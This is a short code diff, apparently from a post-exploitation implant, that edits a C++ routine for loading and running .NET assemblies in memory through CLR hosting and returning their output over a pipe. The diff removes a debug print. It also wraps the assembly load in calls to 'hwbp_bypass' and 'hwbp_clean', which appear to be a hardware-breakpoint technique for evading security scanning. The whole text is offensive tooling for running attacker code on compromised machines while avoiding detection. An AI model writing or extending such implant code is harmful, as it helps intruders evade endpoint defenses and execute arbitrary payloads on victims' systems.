@@ -16,8 +16,6 @@ auto declfn dotnet_exec(
     WCHAR* appdomain  = dotnet_args->appdomain;
     WCHAR* version    = dotnet_args->fmversion;
 
-    self->ntdll.DbgPrint("dotnet init\n");
-
     struct {
         GUID CLRMetaHost;
         GUID CorRuntimeHost;
@@ -227,6 +225,10 @@ auto declfn dotnet_exec(
 
     mm::copy( safeasm->pvData, asm_bytes, asm_length );
 
+    if ( self->postex.bypassflag ) {
+        hwbp_bypass( self->postex.bypassflag );
+    }
+
     result = appdomain_obj->Load_3( safeasm, &assembly_obj );
     if ( FAILED( result ) ) {
         return dotnet_cleanup();
@@ -293,6 +295,10 @@ auto declfn dotnet_exec(
         }
 
         self->kernel32.FlushFileBuffers( self->pipe.output );
+    }
+
+    if ( self->postex.bypassflag ) {
+        hwbp_clean();
     }
 
     return dotnet_cleanup();
